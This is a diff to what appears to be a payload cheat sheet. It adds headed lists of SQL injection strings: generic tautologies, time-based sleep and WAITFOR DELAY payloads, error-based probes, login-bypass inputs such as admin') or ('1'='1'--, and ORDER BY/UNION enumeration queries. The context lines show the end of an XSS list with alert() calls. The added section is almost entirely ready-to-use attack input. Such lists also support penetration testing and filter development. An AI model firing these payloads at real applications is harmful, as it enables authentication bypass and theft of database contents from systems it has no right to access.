@@ -298,3 +298,133 @@ Set.constructor('ale'+'rt(13)')();
 
 Set.constructor`alert(14)```;
 ```
+
+____
+
+
+### SQL Injection Payloads > <a name="generic_sql_injection"></a>Generic SQL Injection
+```html
+' or '
+
+-- or #
+
+' OR '1
+
+' OR 1 -- -
+
+OR "" = "
+
+" OR 1 = 1 -- -"
+
+' OR '' = '
+
+'='
+
+'LIKE'
+
+'=0--+
+
+OR 1=1
+
+' OR 'x'='x
+
+' AND id IS NULL; --
+
+'''''''''''''UNION SELECT '2
+```
+### SQL Injection Payloads > <a name="time_based"></a>Time-Based
+```html
+,(select * from (select(sleep(10)))a)
+
+%2c(select%20*%20from%20(select(sleep(10)))a)
+
+';WAITFOR DELAY '0:0:30'--
+```
+### SQL Injection Payloads > <a name="generic_error_based_payloads"></a>Generic Error Based Payloads
+```html
+OR 1=1
+
+OR 1=1#
+
+OR x=y#
+
+OR 1=1--
+
+OR x=x--
+
+OR 3409=3409 AND ('pytW' LIKE 'pytW
+
+HAVING 1=1
+
+HAVING 1=1#
+
+HAVING 1=0--
+
+AND 1=1--
+
+AND 1=1 AND '%'='
+
+WHERE 1=1 AND 1=0--
+
+%' AND 8310=8310 AND '%'='
+```
+### SQL Injection Payloads > <a name="authentication_based_payloads"></a>Authentication Based Payloads
+```html
+' or ''-'
+
+' or '' '
+
+' or ''&'
+
+' or ''^'
+
+' or ''*'
+
+or true--
+
+" or true--
+
+' or true--
+
+") or true--
+
+') or true--
+
+admin') or ('1'='1'--
+
+admin') or ('1'='1'#
+
+admin') or ('1'='1'/
+```
+### SQL Injection Payloads > <a name="order_by_and_union_based_payloads"></a>Order by and UNION Based Payloads
+```html
+1' ORDER BY 1--+
+
+1' ORDER BY 2--+
+
+1' ORDER BY 3--+
+
+1' ORDER BY 1,2--+
+
+1' ORDER BY 1,2,3--+
+
+1' GROUP BY 1,2,--+
+
+1' GROUP BY 1,2,3--+
+
+' GROUP BY columnnames having 1=1 --
+
+-1' UNION SELECT 1,2,3--+
+
+' UNION SELECT sum(columnname ) from tablename --
+
+-1 UNION SELECT 1 INTO @,@
+
+-1 UNION SELECT 1 INTO @,@,@
+
+1 AND (SELECT * FROM Users) = 1
+
+' AND MID(VERSION(),1,1) = '5';
+
+' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
+```
